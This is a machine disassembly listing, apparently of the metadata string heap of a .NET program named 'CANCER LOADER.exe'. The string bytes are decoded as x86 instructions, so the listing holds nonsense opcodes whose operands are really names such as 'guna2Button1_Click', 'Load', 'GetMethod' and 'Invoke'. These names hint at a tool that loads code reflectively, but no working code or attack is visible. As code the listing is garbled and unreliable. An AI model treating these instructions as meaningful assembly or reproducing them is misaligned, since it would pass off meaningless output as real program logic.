  404e0a:	6f                   	outsl  %ds:(%esi),(%dx)
  404e0b:	6e                   	outsb  %ds:(%esi),(%dx)
  404e0c:	32 5f 43             	xor    0x43(%edi),%bl
  404e0f:	6c                   	insb   (%dx),%es:(%edi)
  404e10:	69 63 6b 3e 64 5f 5f 	imul   $0x5f5f643e,0x6b(%ebx),%esp
  404e17:	36 00 3c 52          	add    %bh,%ss:(%edx,%edx,2)
  404e1b:	55                   	push   %ebp
  404e1c:	30 30                	xor    %dh,(%eax)
  404e1e:	34 3e                	xor    $0x3e,%al
  404e20:	64 5f                	fs pop %edi
  404e22:	5f                   	pop    %edi
  404e23:	37                   	aaa
  404e24:	00 3c 67             	add    %bh,(%edi,%eiz,2)
  404e27:	75 6e                	jne    0x404e97
  404e29:	61                   	popa
  404e2a:	32 42 75             	xor    0x75(%edx),%al
  404e2d:	74 74                	je     0x404ea3
  404e2f:	6f                   	outsl  %ds:(%esi),(%dx)
  404e30:	6e                   	outsb  %ds:(%esi),(%dx)
  404e31:	31 5f 43             	xor    %ebx,0x43(%edi)
  404e34:	6c                   	insb   (%dx),%es:(%edi)
  404e35:	69 63 6b 3e 64 5f 5f 	imul   $0x5f5f643e,0x6b(%ebx),%esp
  404e3c:	38 00                	cmp    %al,(%eax)
  404e3e:	3c 3e                	cmp    $0x3e,%al
  404e40:	39 00                	cmp    %eax,(%eax)
  404e42:	3c 52                	cmp    $0x52,%al
  404e44:	55                   	push   %ebp
  404e45:	30 30                	xor    %dh,(%eax)
  404e47:	35 3e 64 5f 5f       	xor    $0x5f5f643e,%eax
  404e4c:	39 00                	cmp    %eax,(%eax)
  404e4e:	3c 4d                	cmp    $0x4d,%al
  404e50:	6f                   	outsl  %ds:(%esi),(%dx)
  404e51:	64 75 6c             	fs jne 0x404ec0
  404e54:	65 3e 00 67 65       	gs add %ah,%ds:0x65(%edi)
  404e59:	74 5f                	je     0x404eba
  404e5b:	42                   	inc    %edx
  404e5c:	00 53 69             	add    %dl,0x69(%ebx)
  404e5f:	7a 65                	jp     0x404ec6
  404e61:	46                   	inc    %esi
  404e62:	00 67 65             	add    %ah,0x65(%edi)
  404e65:	74 5f                	je     0x404ec6
  404e67:	47                   	inc    %edi
  404e68:	00 53 79             	add    %dl,0x79(%ebx)
  404e6b:	73 74                	jae    0x404ee1
  404e6d:	65 6d                	gs insl (%dx),%es:(%edi)
  404e6f:	2e 49                	cs dec %ecx
  404e71:	4f                   	dec    %edi
  404e72:	00 43 41             	add    %al,0x41(%ebx)
  404e75:	4e                   	dec    %esi
  404e76:	43                   	inc    %ebx
  404e77:	45                   	inc    %ebp
  404e78:	52                   	push   %edx
  404e79:	20 4c 4f 41          	and    %cl,0x41(%edi,%ecx,2)
  404e7d:	44                   	inc    %esp
  404e7e:	45                   	inc    %ebp
  404e7f:	52                   	push   %edx
  404e80:	00 67 65             	add    %ah,0x65(%edi)
  404e83:	74 5f                	je     0x404ee4
  404e85:	52                   	push   %edx
  404e86:	00 46 72             	add    %al,0x72(%esi)
  404e89:	6f                   	outsl  %ds:(%esi),(%dx)
  404e8a:	6d                   	insl   (%dx),%es:(%edi)
  404e8b:	41                   	inc    %ecx
  404e8c:	72 67                	jb     0x404ef5
  404e8e:	62 00                	bound  %eax,(%eax)
  404e90:	6d                   	insl   (%dx),%es:(%edi)
  404e91:	73 63                	jae    0x404ef6
  404e93:	6f                   	outsl  %ds:(%esi),(%dx)
  404e94:	72 6c                	jb     0x404f02
  404e96:	69 62 00 3c 3e 63 00 	imul   $0x633e3c,0x0(%edx),%esp
  404e9d:	3c 3c                	cmp    $0x3c,%al
  404e9f:	55                   	push   %ebp
  404ea0:	53                   	push   %ebx
  404ea1:	30 30                	xor    %dh,(%eax)
  404ea3:	32 3e                	xor    (%esi),%bh
  404ea5:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  404ea8:	30 3e                	xor    %bh,(%esi)
  404eaa:	64 00 3c 3c          	add    %bh,%fs:(%esp,%edi,1)
  404eae:	52                   	push   %edx
  404eaf:	55                   	push   %ebp
  404eb0:	30 30                	xor    %dh,(%eax)
  404eb2:	32 3e                	xor    (%esi),%bh
  404eb4:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  404eb7:	30 3e                	xor    %bh,(%esi)
  404eb9:	64 00 4c 6f 61       	add    %cl,%fs:0x61(%edi,%ebp,2)
  404ebe:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  404ec2:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  404ec6:	74 5f                	je     0x404f27
  404ec8:	49                   	dec    %ecx
  404ec9:	6e                   	outsb  %ds:(%esi),(%dx)
  404eca:	76 6f                	jbe    0x404f3b
  404ecc:	6b 65 52 65          	imul   $0x65,0x52(%ebp),%esp
  404ed0:	71 75                	jno    0x404f47
  404ed2:	69 72 65 64 00 41 77 	imul   $0x77410064,0x65(%edx),%esi
  404ed9:	61                   	popa
  404eda:	69 74 55 6e 73 61 66 	imul   $0x65666173,0x6e(%ebp,%edx,2),%esi
  404ee1:	65 
  404ee2:	4f                   	dec    %edi
  404ee3:	6e                   	outsb  %ds:(%esi),(%dx)
  404ee4:	43                   	inc    %ebx
  404ee5:	6f                   	outsl  %ds:(%esi),(%dx)
  404ee6:	6d                   	insl   (%dx),%es:(%edi)
  404ee7:	70 6c                	jo     0x404f55
  404ee9:	65 74 65             	gs je  0x404f51
  404eec:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  404ef0:	74 5f                	je     0x404f51
  404ef2:	49                   	dec    %ecx
  404ef3:	73 43                	jae    0x404f38
  404ef5:	6f                   	outsl  %ds:(%esi),(%dx)
  404ef6:	6d                   	insl   (%dx),%es:(%edi)
  404ef7:	70 6c                	jo     0x404f65
  404ef9:	65 74 65             	gs je  0x404f61
  404efc:	64 00 53 79          	add    %dl,%fs:0x79(%ebx)
  404f00:	6e                   	outsb  %ds:(%esi),(%dx)
  404f01:	63 68 72             	arpl   %ebp,0x72(%eax)
  404f04:	6f                   	outsl  %ds:(%esi),(%dx)
  404f05:	6e                   	outsb  %ds:(%esi),(%dx)
  404f06:	69 7a 65 64 00 47 65 	imul   $0x65470064,0x65(%edx),%edi
  404f0d:	74 4d                	je     0x404f5c
  404f0f:	65 74 68             	gs je  0x404f7a
  404f12:	6f                   	outsl  %ds:(%esi),(%dx)
  404f13:	64 00 64 65 66       	add    %ah,%fs:0x66(%ebp,%eiz,2)
  404f18:	61                   	popa
  404f19:	75 6c                	jne    0x404f87
  404f1b:	74 49                	je     0x404f66
  404f1d:	6e                   	outsb  %ds:(%esi),(%dx)
  404f1e:	73 74                	jae    0x404f94
  404f20:	61                   	popa
  404f21:	6e                   	outsb  %ds:(%esi),(%dx)
  404f22:	63 65 00             	arpl   %esp,0x0(%ebp)
  404f25:	73 65                	jae    0x404f8c
  404f27:	74 5f                	je     0x404f88
  404f29:	41                   	inc    %ecx
  404f2a:	75 74                	jne    0x404fa0
  404f2c:	6f                   	outsl  %ds:(%esi),(%dx)
  404f2d:	53                   	push   %ebx
  404f2e:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  404f31:	65 4d                	gs dec %ebp
  404f33:	6f                   	outsl  %ds:(%esi),(%dx)
  404f34:	64 65 00 49 6d       	fs add %cl,%gs:0x6d(%ecx)
  404f39:	61                   	popa
  404f3a:	67 65 00 69 6d       	add    %ch,%gs:0x6d(%bx,%di)
  404f3f:	61                   	popa
  404f40:	67 65 00 6d 65       	add    %ch,%gs:0x65(%di)
  404f45:	73 73                	jae    0x404fba
  404f47:	61                   	popa
  404f48:	67 65 00 49 6e       	add    %cl,%gs:0x6e(%bx,%di)
  404f4d:	76 6f                	jbe    0x404fbe
  404f4f:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  404f53:	44                   	inc    %esp
  404f54:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  404f5b:	6c                   	insb   (%dx),%es:(%edi)
  404f5c:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  404f60:	6e                   	outsb  %ds:(%esi),(%dx)
  404f61:	74 69                	je     0x404fcc
  404f63:	6d                   	insl   (%dx),%es:(%edi)
  404f64:	65 54                	gs push %esp
  404f66:	79 70                	jns    0x404fd8
  404f68:	65 48                	gs dec %eax
  404f6a:	61                   	popa
  404f6b:	6e                   	outsb  %ds:(%esi),(%dx)
  404f6c:	64 6c                	fs insb (%dx),%es:(%edi)
  404f6e:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  404f72:	74 54                	je     0x404fc8
  404f74:	79 70                	jns    0x404fe6
  404f76:	65 46                	gs inc %esi
  404f78:	72 6f                	jb     0x404fe9
  404f7a:	6d                   	insl   (%dx),%es:(%edi)
  404f7b:	48                   	dec    %eax
  404f7c:	61                   	popa
  404f7d:	6e                   	outsb  %ds:(%esi),(%dx)
  404f7e:	64 6c                	fs insb (%dx),%es:(%edi)
  404f80:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  404f84:	6c                   	insb   (%dx),%es:(%edi)
  404f85:	65 00 44 6f 63       	add    %al,%gs:0x63(%edi,%ebp,2)
  404f8a:	6b 53 74 79          	imul   $0x79,0x74(%ebx),%edx
  404f8e:	6c                   	insb   (%dx),%es:(%edi)
  404f8f:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  404f93:	74 5f                	je     0x404ff4
  404f95:	46                   	inc    %esi
  404f96:	6f                   	outsl  %ds:(%esi),(%dx)
  404f97:	72 6d                	jb     0x405006
  404f99:	42                   	inc    %edx
  404f9a:	6f                   	outsl  %ds:(%esi),(%dx)
  404f9b:	72 64                	jb     0x405001
  404f9d:	65 72 53             	gs jb  0x404ff3
  404fa0:	74 79                	je     0x40501b
  404fa2:	6c                   	insb   (%dx),%es:(%edi)
  404fa3:	65 00 46 6f          	add    %al,%gs:0x6f(%esi)
  404fa7:	6e                   	outsb  %ds:(%esi),(%dx)
  404fa8:	74 53                	je     0x404ffd
  404faa:	74 79                	je     0x405025
  404fac:	6c                   	insb   (%dx),%es:(%edi)
  404fad:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  404fb1:	74 5f                	je     0x405012
  404fb3:	4e                   	dec    %esi
  404fb4:	61                   	popa
  404fb5:	6d                   	insl   (%dx),%es:(%edi)
  404fb6:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  404fba:	6d                   	insl   (%dx),%es:(%edi)
  404fbb:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  404fbf:	6d                   	insl   (%dx),%es:(%edi)
  404fc0:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  404fc3:	65 00 49 41          	add    %cl,%gs:0x41(%ecx)
  404fc7:	73 79                	jae    0x405042
  404fc9:	6e                   	outsb  %ds:(%esi),(%dx)
  404fca:	63 53 74             	arpl   %edx,0x74(%ebx)
  404fcd:	61                   	popa
  404fce:	74 65                	je     0x405035
  404fd0:	4d                   	dec    %ebp
  404fd1:	61                   	popa
  404fd2:	63 68 69             	arpl   %ebp,0x69(%eax)
  404fd5:	6e                   	outsb  %ds:(%esi),(%dx)
  404fd6:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  404fda:	74 53                	je     0x40502f
  404fdc:	74 61                	je     0x40503f
  404fde:	74 65                	je     0x405045
  404fe0:	4d                   	dec    %ebp
  404fe1:	61                   	popa
  404fe2:	63 68 69             	arpl   %ebp,0x69(%eax)
  404fe5:	6e                   	outsb  %ds:(%esi),(%dx)
  404fe6:	65 00 73 74          	add    %dh,%gs:0x74(%ebx)
  404fea:	61                   	popa
  404feb:	74 65                	je     0x405052
  404fed:	4d                   	dec    %ebp
  404fee:	61                   	popa
  404fef:	63 68 69             	arpl   %ebp,0x69(%eax)
  404ff2:	6e                   	outsb  %ds:(%esi),(%dx)
  404ff3:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  404ff7:	6c                   	insb   (%dx),%es:(%edi)
  404ff8:	75 65                	jne    0x40505f
  404ffa:	54                   	push   %esp
  404ffb:	79 70                	jns    0x40506d
  404ffd:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  405001:	74 54                	je     0x405057
  405003:	79 70                	jns    0x405075
  405005:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  405009:	74 5f                	je     0x40506a
  40500b:	43                   	inc    %ebx
  40500c:	6f                   	outsl  %ds:(%esi),(%dx)
  40500d:	6e                   	outsb  %ds:(%esi),(%dx)
  40500e:	74 72                	je     0x405082
  405010:	6f                   	outsl  %ds:(%esi),(%dx)
  405011:	6c                   	insb   (%dx),%es:(%edi)
  405012:	42                   	inc    %edx
  405013:	6f                   	outsl  %ds:(%esi),(%dx)
  405014:	78 54                	js     0x40506a
  405016:	79 70                	jns    0x405088
  405018:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40501c:	74 5f                	je     0x40507d
  40501e:	43                   	inc    %ebx
  40501f:	75 6c                	jne    0x40508d
  405021:	74 75                	je     0x405098
  405023:	72 65                	jb     0x40508a
  405025:	00 73 65             	add    %dh,0x65(%ebx)
  405028:	74 5f                	je     0x405089
  40502a:	43                   	inc    %ebx
  40502b:	75 6c                	jne    0x405099
  40502d:	74 75                	je     0x4050a4
  40502f:	72 65                	jb     0x405096
  405031:	00 72 65             	add    %dh,0x65(%edx)
  405034:	73 6f                	jae    0x4050a5
  405036:	75 72                	jne    0x4050aa
  405038:	63 65 43             	arpl   %esp,0x43(%ebp)
  40503b:	75 6c                	jne    0x4050a9
  40503d:	74 75                	je     0x4050b4
  40503f:	72 65                	jb     0x4050a6
  405041:	00 4d 65             	add    %cl,0x65(%ebp)
  405044:	74 68                	je     0x4050ae
  405046:	6f                   	outsl  %ds:(%esi),(%dx)
  405047:	64 42                	fs inc %edx
  405049:	61                   	popa
  40504a:	73 65                	jae    0x4050b1
  40504c:	00 41 70             	add    %al,0x70(%ecx)
  40504f:	70 6c                	jo     0x4050bd
  405051:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  405058:	53                   	push   %ebx
  405059:	65 74 74             	gs je  0x4050d0
  40505c:	69 6e 67 73 42 61 73 	imul   $0x73614273,0x67(%esi),%ebp
  405063:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  405068:	70 6f                	jo     0x4050d9
  40506a:	73 65                	jae    0x4050d1
  40506c:	00 43 72             	add    %al,0x72(%ebx)
  40506f:	65 61                	gs popa
  405071:	74 65                	je     0x4050d8
  405073:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  405077:	65 67 61             	gs addr16 popa
  40507a:	74 65                	je     0x4050e1
  40507c:	00 45 64             	add    %al,0x64(%ebp)
  40507f:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  405086:	77 
  405087:	73 61                	jae    0x4050ea
  405089:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  40508d:	74 61                	je     0x4050f0
  40508f:	74 65                	je     0x4050f6
  405091:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  405094:	31 5f 5f             	xor    %ebx,0x5f(%edi)
  405097:	73 74                	jae    0x40510d
  405099:	61                   	popa
  40509a:	74 65                	je     0x405101
  40509c:	00 67 65             	add    %ah,0x65(%edi)
  40509f:	74 5f                	je     0x405100
  4050a1:	57                   	push   %edi
  4050a2:	68 69 74 65 00       	push   $0x657469
  4050a7:	53                   	push   %ebx
  4050a8:	54                   	push   %esp
  4050a9:	41                   	inc    %ecx
  4050aa:	54                   	push   %esp
  4050ab:	68 72 65 61 64       	push   $0x64616572
  4050b0:	41                   	inc    %ecx
  4050b1:	74 74                	je     0x405127
  4050b3:	72 69                	jb     0x40511e
  4050b5:	62 75 74             	bound  %esi,0x74(%ebp)
  4050b8:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  4050bc:	6d                   	insl   (%dx),%es:(%edi)
  4050bd:	70 69                	jo     0x405128
  4050bf:	6c                   	insb   (%dx),%es:(%edi)
  4050c0:	65 72 47             	gs jb  0x40510a
  4050c3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4050c5:	65 72 61             	gs jb  0x405129
  4050c8:	74 65                	je     0x40512f
  4050ca:	64 41                	fs inc %ecx
  4050cc:	74 74                	je     0x405142
  4050ce:	72 69                	jb     0x405139
  4050d0:	62 75 74             	bound  %esi,0x74(%ebp)
  4050d3:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  4050d7:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  4050de:	62 
  4050df:	75 74                	jne    0x405155
  4050e1:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4050e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4050e6:	65 72 61             	gs jb  0x40514a
  4050e9:	74 65                	je     0x405150
  4050eb:	64 43                	fs inc %ebx
  4050ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4050ee:	64 65 41             	fs gs inc %ecx
  4050f1:	74 74                	je     0x405167
  4050f3:	72 69                	jb     0x40515e
  4050f5:	62 75 74             	bound  %esi,0x74(%ebp)
  4050f8:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  4050fd:	75 67                	jne    0x405166
  4050ff:	67 65 72 4e          	addr16 gs jb 0x405151
  405103:	6f                   	outsl  %ds:(%esi),(%dx)
  405104:	6e                   	outsb  %ds:(%esi),(%dx)
  405105:	55                   	push   %ebp
  405106:	73 65                	jae    0x40516d
  405108:	72 43                	jb     0x40514d
  40510a:	6f                   	outsl  %ds:(%esi),(%dx)
  40510b:	64 65 41             	fs gs inc %ecx
  40510e:	74 74                	je     0x405184
  405110:	72 69                	jb     0x40517b
  405112:	62 75 74             	bound  %esi,0x74(%ebp)
  405115:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40511a:	75 67                	jne    0x405183
  40511c:	67 61                	addr16 popa
  40511e:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  405122:	74 74                	je     0x405198
  405124:	72 69                	jb     0x40518f
  405126:	62 75 74             	bound  %esi,0x74(%ebp)
  405129:	65 00 45 64          	add    %al,%gs:0x64(%ebp)
  40512d:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  405134:	77 
  405135:	73 61                	jae    0x405198
  405137:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40513b:	74 74                	je     0x4051b1
  40513d:	72 69                	jb     0x4051a8
  40513f:	62 75 74             	bound  %esi,0x74(%ebp)
  405142:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  405146:	6d                   	insl   (%dx),%es:(%edi)
  405147:	56                   	push   %esi
  405148:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40514f:	74 74                	je     0x4051c5
  405151:	72 69                	jb     0x4051bc
  405153:	62 75 74             	bound  %esi,0x74(%ebp)
  405156:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40515a:	73 65                	jae    0x4051c1
  40515c:	6d                   	insl   (%dx),%es:(%edi)
  40515d:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  405161:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  405168:	72 
  405169:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  405170:	73 79                	jae    0x4051eb
  405172:	6e                   	outsb  %ds:(%esi),(%dx)
  405173:	63 53 74             	arpl   %edx,0x74(%ebx)
  405176:	61                   	popa
  405177:	74 65                	je     0x4051de
  405179:	4d                   	dec    %ebp
  40517a:	61                   	popa
  40517b:	63 68 69             	arpl   %ebp,0x69(%eax)
  40517e:	6e                   	outsb  %ds:(%esi),(%dx)
  40517f:	65 41                	gs inc %ecx
  405181:	74 74                	je     0x4051f7
  405183:	72 69                	jb     0x4051ee
  405185:	62 75 74             	bound  %esi,0x74(%ebp)
  405188:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40518c:	73 65                	jae    0x4051f3
  40518e:	6d                   	insl   (%dx),%es:(%edi)
  40518f:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  405193:	72 61                	jb     0x4051f6
  405195:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  405198:	61                   	popa
  405199:	72 6b                	jb     0x405206
  40519b:	41                   	inc    %ecx
  40519c:	74 74                	je     0x405212
  40519e:	72 69                	jb     0x405209
  4051a0:	62 75 74             	bound  %esi,0x74(%ebp)
  4051a3:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4051a8:	67 65 74 46          	addr16 gs je 0x4051f2
  4051ac:	72 61                	jb     0x40520f
  4051ae:	6d                   	insl   (%dx),%es:(%edi)
  4051af:	65 77 6f             	gs ja  0x405221
  4051b2:	72 6b                	jb     0x40521f
  4051b4:	41                   	inc    %ecx
  4051b5:	74 74                	je     0x40522b
  4051b7:	72 69                	jb     0x405222
  4051b9:	62 75 74             	bound  %esi,0x74(%ebp)
  4051bc:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  4051c1:	75 67                	jne    0x40522a
  4051c3:	67 65 72 48          	addr16 gs jb 0x40520f
  4051c7:	69 64 64 65 6e 41 74 	imul   $0x7474416e,0x65(%esp,%eiz,2),%esp
  4051ce:	74 
  4051cf:	72 69                	jb     0x40523a
  4051d1:	62 75 74             	bound  %esi,0x74(%ebp)
  4051d4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4051d8:	73 65                	jae    0x40523f
  4051da:	6d                   	insl   (%dx),%es:(%edi)
  4051db:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4051df:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4051e6:	69 
  4051e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4051e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4051e9:	41                   	inc    %ecx
  4051ea:	74 74                	je     0x405260
  4051ec:	72 69                	jb     0x405257
  4051ee:	62 75 74             	bound  %esi,0x74(%ebp)
  4051f1:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4051f5:	73 65                	jae    0x40525c
  4051f7:	6d                   	insl   (%dx),%es:(%edi)
  4051f8:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4051fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4051fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4051fe:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  405204:	74 69                	je     0x40526f
  405206:	6f                   	outsl  %ds:(%esi),(%dx)
  405207:	6e                   	outsb  %ds:(%esi),(%dx)
  405208:	41                   	inc    %ecx
  405209:	74 74                	je     0x40527f
  40520b:	72 69                	jb     0x405276
  40520d:	62 75 74             	bound  %esi,0x74(%ebp)
  405210:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  405214:	73 65                	jae    0x40527b
  405216:	6d                   	insl   (%dx),%es:(%edi)
  405217:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  40521b:	65 73 63             	gs jae 0x405281
  40521e:	72 69                	jb     0x405289
  405220:	70 74                	jo     0x405296
  405222:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  405229:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  405230:	6f                   	outsl  %ds:(%esi),(%dx)
  405231:	6d                   	insl   (%dx),%es:(%edi)
  405232:	70 69                	jo     0x40529d
  405234:	6c                   	insb   (%dx),%es:(%edi)
  405235:	61                   	popa
  405236:	74 69                	je     0x4052a1
  405238:	6f                   	outsl  %ds:(%esi),(%dx)
  405239:	6e                   	outsb  %ds:(%esi),(%dx)
  40523a:	52                   	push   %edx
  40523b:	65 6c                	gs insb (%dx),%es:(%edi)
  40523d:	61                   	popa
  40523e:	78 61                	js     0x4052a1
  405240:	74 69                	je     0x4052ab
  405242:	6f                   	outsl  %ds:(%esi),(%dx)
  405243:	6e                   	outsb  %ds:(%esi),(%dx)
  405244:	73 41                	jae    0x405287
  405246:	74 74                	je     0x4052bc
  405248:	72 69                	jb     0x4052b3
  40524a:	62 75 74             	bound  %esi,0x74(%ebp)
  40524d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  405251:	73 65                	jae    0x4052b8
  405253:	6d                   	insl   (%dx),%es:(%edi)
  405254:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  405258:	72 6f                	jb     0x4052c9
  40525a:	64 75 63             	fs jne 0x4052c0
  40525d:	74 41                	je     0x4052a0
  40525f:	74 74                	je     0x4052d5
  405261:	72 69                	jb     0x4052cc
  405263:	62 75 74             	bound  %esi,0x74(%ebp)
  405266:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40526a:	73 65                	jae    0x4052d1
  40526c:	6d                   	insl   (%dx),%es:(%edi)
  40526d:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  405271:	6f                   	outsl  %ds:(%esi),(%dx)
  405272:	70 79                	jo     0x4052ed
  405274:	72 69                	jb     0x4052df
  405276:	67 68 74 41 74 74    	addr16 push $0x74744174
  40527c:	72 69                	jb     0x4052e7
  40527e:	62 75 74             	bound  %esi,0x74(%ebp)
  405281:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  405285:	73 65                	jae    0x4052ec
  405287:	6d                   	insl   (%dx),%es:(%edi)
  405288:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40528c:	6f                   	outsl  %ds:(%esi),(%dx)
  40528d:	6d                   	insl   (%dx),%es:(%edi)
  40528e:	70 61                	jo     0x4052f1
  405290:	6e                   	outsb  %ds:(%esi),(%dx)
  405291:	79 41                	jns    0x4052d4
  405293:	74 74                	je     0x405309
  405295:	72 69                	jb     0x405300
  405297:	62 75 74             	bound  %esi,0x74(%ebp)
  40529a:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40529e:	6e                   	outsb  %ds:(%esi),(%dx)
  40529f:	74 69                	je     0x40530a
  4052a1:	6d                   	insl   (%dx),%es:(%edi)
  4052a2:	65 43                	gs inc %ebx
  4052a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4052a5:	6d                   	insl   (%dx),%es:(%edi)
  4052a6:	70 61                	jo     0x405309
  4052a8:	74 69                	je     0x405313
  4052aa:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4052ad:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4052b4:	69 
  4052b5:	62 75 74             	bound  %esi,0x74(%ebp)
  4052b8:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4052bc:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4052c3:	00 
  4052c4:	67 65 74 5f          	addr16 gs je 0x405327
  4052c8:	56                   	push   %esi
  4052c9:	61                   	popa
  4052ca:	6c                   	insb   (%dx),%es:(%edi)
  4052cb:	75 65                	jne    0x405332
  4052cd:	00 73 65             	add    %dh,0x65(%ebx)
  4052d0:	74 5f                	je     0x405331
  4052d2:	56                   	push   %esi
  4052d3:	61                   	popa
  4052d4:	6c                   	insb   (%dx),%es:(%edi)
  4052d5:	75 65                	jne    0x40533c
  4052d7:	00 73 65             	add    %dh,0x65(%ebx)
  4052da:	74 5f                	je     0x40533b
  4052dc:	44                   	inc    %esp
  4052dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4052de:	63 6b 49             	arpl   %ebp,0x49(%ebx)
  4052e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4052e2:	64 69 63 61 74 6f 72 	imul   $0x54726f74,%fs:0x61(%ebx),%esp
  4052e9:	54 
  4052ea:	72 61                	jb     0x40534d
  4052ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4052ed:	73 70                	jae    0x40535f
  4052ef:	61                   	popa
  4052f0:	72 65                	jb     0x405357
  4052f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4052f3:	63 79 56             	arpl   %edi,0x56(%ecx)
  4052f6:	61                   	popa
  4052f7:	6c                   	insb   (%dx),%es:(%edi)
  4052f8:	75 65                	jne    0x40535f
  4052fa:	00 76 61             	add    %dh,0x61(%esi)
  4052fd:	6c                   	insb   (%dx),%es:(%edi)
  4052fe:	75 65                	jne    0x405365
  405300:	00 43 41             	add    %al,0x41(%ebx)
  405303:	4e                   	dec    %esi
  405304:	43                   	inc    %ebx
  405305:	45                   	inc    %ebp
  405306:	52                   	push   %edx
  405307:	20 4c 4f 41          	and    %cl,0x41(%edi,%ecx,2)
  40530b:	44                   	inc    %esp
  40530c:	45                   	inc    %ebp
  40530d:	52                   	push   %edx
  40530e:	2e 65 78 65          	cs js,pn 0x405377
  405312:	00 73 65             	add    %dh,0x65(%ebx)
  405315:	74 5f                	je     0x405376
  405317:	53                   	push   %ebx
  405318:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40531f:	5f                   	pop    %edi
  405320:	43                   	inc    %ebx
  405321:	6c                   	insb   (%dx),%es:(%edi)
  405322:	69 65 6e 74 53 69 7a 	imul   $0x7a695374,0x6e(%ebp),%esp
  405329:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40532d:	74 5f                	je     0x40538e
  40532f:	54                   	push   %esp
  405330:	72 61                	jb     0x405393
  405332:	6e                   	outsb  %ds:(%esi),(%dx)
  405333:	73 70                	jae    0x4053a5
  405335:	61                   	popa
  405336:	72 65                	jb     0x40539d
  405338:	6e                   	outsb  %ds:(%esi),(%dx)
  405339:	74 57                	je     0x405392
  40533b:	68 69 6c 65 44       	push   $0x44656c69
